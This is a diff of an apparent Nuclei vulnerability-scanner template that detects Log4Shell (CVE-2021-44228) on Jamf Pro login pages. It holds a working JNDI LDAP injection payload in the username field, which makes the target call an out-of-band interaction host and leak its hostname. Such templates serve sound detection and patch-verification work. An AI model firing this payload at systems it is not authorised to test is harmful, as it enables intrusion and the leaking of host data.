@@ -16,13 +16,17 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
     cve-id: CVE-2021-44228
-    cwe-id: CWE-77
+    cwe-id: CWE-77,CWE-502
   metadata:
+    verified: true
+    max-request: 1
     shodan-query: title:"Jamf Pro"
-    verified: "true"
-  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev
+  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev,vuln
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
-requests:
+http:
   - raw:
       - |
         POST / HTTP/1.1
@@ -31,30 +35,39 @@ requests:
         Referer: {{RootURL}}
         Content-Type: application/x-www-form-urlencoded
 
-        username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=
+        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: body
+        words:
+          - "<title>Jamf Pro Login</title>"
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
 
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
-
-      - type: word
-        part: body
-        words:
-          - "<title>Jamf Pro Login</title>"
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
-# Enhanced by mp on 2022/05/27
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 490a00463044022070c6c2400a4da8b15295aaceb3bfb6f7bfdf86208cd581d1af1c7b3ce44afdf9022041ef70e34d1152df44afc80b8a0971f67fb72fafe14f58543b65efbde935dc64:922c64590222798bb761d5b6d8e72950
